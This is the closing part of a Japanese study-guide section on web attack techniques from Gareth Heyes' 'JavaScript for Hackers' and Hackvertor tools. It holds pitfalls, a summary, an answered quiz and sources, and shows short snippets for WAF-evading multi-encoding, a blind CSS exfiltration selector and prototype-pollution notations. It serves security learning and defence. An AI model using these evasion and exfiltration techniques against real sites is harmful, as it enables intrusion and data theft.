- **ネストの処理順を逆に考える**: Hackvertor は「最内タグから最外タグへ」処理する。`<@urlencode_all><@base64>...</@base64></@urlencode_all>` は「Base64 してから URLエンコード」。順序を取り違えると出力が合わない。
- **引数のクォート規則**: 文字列引数はシングルクォート、数値はクォート不要。`check` タグ内でタグ名にアンダースコアがある場合のみクォートが要る。
- **`check` タグが無いと `&&` `||` `!` はただの文字**: Tag Expressions は `check` タグとセットで初めて論理演算子として働く。既存ペイロードとの互換のための仕様。
- **エンコードは万能ではない**: 多重エンコードで通るのは「デコードのタイミングにズレがある」場合。最終的にブラウザ／サーバがどこでデコードするかを理解していないと、ただ壊れた入力になる。
- **プロトタイプ汚染はblind**: サーバ内部の汚染は直接見えない。JSON spaces・Status・Options など「観測可能な副作用」で判定する発想が要る。
- **AutoVader の Remove CSP が既定有効**: CSPを外して解析する設計。実環境の挙動と食い違う可能性があるので、CSPありでの再現も確認する。
- **原典が読めていない前提**: 本節は書籍・ブログ本文ではなく、同一著者のGitHub資料に基づく。章題や記事タイトルは各自で原典を開いて確認すること。

## この節のまとめ

- 「JavaScript for Hackers」は Gareth Heyes（PortSwigger研究者、Hackvertor作者）による、攻撃者視点でJSを読む実践書である。
- 本節の担当原典2URLは執筆環境で遮断されたため、同一著者の公開GitHub資料を代替一次資料として用いている。原典は読者自身が開く必要がある。
- 攻撃者は処理系ごとの「デコードのタイミングのズレ」を突き、多重エンコード（エンコード連鎖）でWAFやフィルタを回避する。
- Hackvertor は `<@タグ名>中身</@タグ名>` 構文で、エンコード／デコード／ハッシュ／暗号／文字列変換を無制限にネストできる Burp拡張。処理は最内→最外の順。
- 難読化で重要なタグは `hex_escapes` `unicode_escapes` `octal_escapes` `dec_entities` `hex_entities` `utf7` `to_charcode` `from_charcode` など。
- 引数は文字列（シングルクォート）・真偽値・数値の3種。`check` タグと `&& || !` で条件付き変換ができる。
- MentalJS は変数・アクセサに `$` を付けてJSをホワイトリスト化するサンドボックスで、JSパーサの理解が攻撃・防御の両面で鍵になることを示す。
- Blind CSS Exfiltration は、属性セレクタ＋`@import` でCSSだけを使い、未知ページの秘密を1文字ずつ盲目的に窃取する。
- プロトタイプ汚染は `__proto__`／`constructor.prototype` を汚染する脆弱性で、blind な汚染は JSON spaces・Status・Options・Reflection などの副作用で検出する。
- server-side-prototype-pollution 拡張は Body/Param × dot/square など多様な記法でスキャンする。
- AutoVader は DOM Invader と Playwright を統合し、source/sink/gadget/message/redirect の観点でDOM系脆弱性を自動探索する。そのスキャン分類はそのままハンティングのチェックリストになる。
- AutoVader の `Remove CSP` が既定有効な点は、CSPが動的解析を妨げる実務上の問題を示す。
- 周辺ツール（clickbandit, visualfuzzer, taborator ほか）も同一著者による、クリックジャッキングやUnicodeファジングなど関連技術の実装である。
- 攻撃手法はすべて、自分で立てた検証環境か許可されたバグバウンティ範囲でのみ試すこと。防御（出力エスケープ、CSP、危険キーの拒否）と対で理解する。

## 理解度チェック

1. Hackvertor で `<@urlencode_all><@base64>payload</@base64></@urlencode_all>` を評価すると、どちらの変換が先に行われるか。
   ▶ 答え: Base64 が先。Hackvertor は最も内側のタグから最も外側へ順に処理するため、まず `payload` を Base64 化し（`cGF5bG9hZA==`）、その後 URLエンコードする。

2. 攻撃者が「多重エンコード」でWAFを回避できるのはなぜか。
   ▶ 答え: WAF・アプリ・ブラウザなど各処理系が「どこまでデコードするか」が違い、その解釈のズレを突けるから。WAFが認識できない別表現にしておき、最終段だけがデコードして実行するよう仕向ける。

3. Hackvertor の引数で、文字列と数値のクォート規則はどう違うか。
   ▶ 答え: 文字列引数はシングル（またはダブル）クォートで囲む。数値はクォート不要（16進数を含む）。例: `<@replace('old','new')>` と `<@rotN(13)>`。

4. MentalJS はどうやってJSコードを制限するか。
   ▶ 答え: 変数とアクセサに `$` 接尾辞を付けてホワイトリスト化する。JSをパースし、許可された部分集合だけを実行するサンドボックスとして働く。

5. Blind CSS Exfiltration で、CSSしか注入できないのに秘密を盗めるのはなぜか。
   ▶ 答え: 属性セレクタ（例 `[attr^="a"]{background:url(...)}`）で「値が特定文字で始まるか」を背景URLの読み込み有無として観測でき、`@import` で窃取サーバのスタイルを段階的に読み込ませて1文字ずつ絞り込めるから。

6. サーバサイドのプロトタイプ汚染が「blind（見えない）」でも検出できるのはなぜか。何を観測するか。
   ▶ 答え: 汚染成立時に起こる観測可能な副作用を見るから。JSON spaces（応答整形の乱れ）、Status（ステータス変化）、Options（OPTIONS応答の変化）、Exposed headers、Reflection などがテクニック名として挙がる。

7. プロトタイプ汚染を試すときの「ドット記法」と「角括弧記法」の例をそれぞれ挙げよ。
   ▶ 答え: ドット記法は `__proto__.x`、角括弧記法は `__proto__[x]`。スキャナも Body dot/square、Param dot/square として両方を試す。

8. AutoVader のスキャン種別で、postMessage（web message）の脆弱性を探すのはどれか。何を狙うか。
   ▶ 答え: Scan web messages。オリジン偽装、メッセージ注入、危険なメッセージハンドラの特定を狙う。

9. AutoVader の `Remove CSP` が既定で有効なのはなぜで、何に注意すべきか。
   ▶ 答え: DOM Invader を正しく動かすためCSPヘッダを除去している。ただし実環境ではCSPが挙動を変えるため、CSPありでも再現確認する必要がある。

10. 本節の記述の根拠が「書籍そのもの」ではないのはなぜか。
    ▶ 答え: 担当原典2URL（Leanpub書籍ページと garethheyes.co.uk）が執筆環境のegressポリシーで完全遮断され取得できなかったため。代わりに同一著者の公開GitHub資料を一次資料として用いている。

## 出典

- https://leanpub.com/javascriptforhackers （原典は取得できず／書籍ページ）
- https://garethheyes.co.uk/ （原典は取得できず／著者ブログ）
- https://github.com/hackvertor/hackvertor （＋ wiki: Tag-Reference / Tag-Syntax / CHANGELOG）
- https://github.com/hackvertor/MentalJS
- https://github.com/hackvertor/server-side-prototype-pollution
- https://github.com/hackvertor/blind-css-exfiltration
- https://github.com/hackvertor/auto-vader
- https://portswigger.net/research/blind-css-exfiltration
- https://portswigger.net/research/server-side-prototype-pollution
- https://github.com/hackvertor/clickbandit ／ visualfuzzer ／ taborator ／ shadow-repeater ／ repeat-strike ／ document-my-pentest ／ speedy ／ feedworm ／ amplify-the-hacker

<!-- sources: https://leanpub.com/javascriptforhackers, https://garethheyes.co.uk/, https://github.com/hackvertor/hackvertor, https://github.com/hackvertor/MentalJS, https://github.com/hackvertor/server-side-prototype-pollution, https://github.com/hackvertor/blind-css-exfiltration, https://github.com/hackvertor/auto-vader, https://portswigger.net/research/blind-css-exfiltration, https://portswigger.net/research/server-side-prototype-pollution -->
<!-- terms: エンコード連鎖, 多重エンコード, Hackvertor, タグベース変換, ネスト, MentalJS, JSサンドボックス, プロトタイプ汚染, __proto__, Blind CSS Exfiltration, 属性セレクタ, @import, DOM Invader, AutoVader, source/sink/gadget, mutation XSS, DOM clobbering, CSPバイパス, WAF回避, HMAC -->
<!-- self-read: https://leanpub.com/javascriptforhackers | leanpub.comがegressポリシーで遮断、有料本文は購入者向けで取得不能 -->
<!-- self-read: https://garethheyes.co.uk/ | サイトがegressポリシーで遮断、記事本文・PoCデモを取得不能 -->
<!-- self-read: https://portswigger.net/research/blind-css-exfiltration | portswigger.netがegressポリシーで遮断 -->
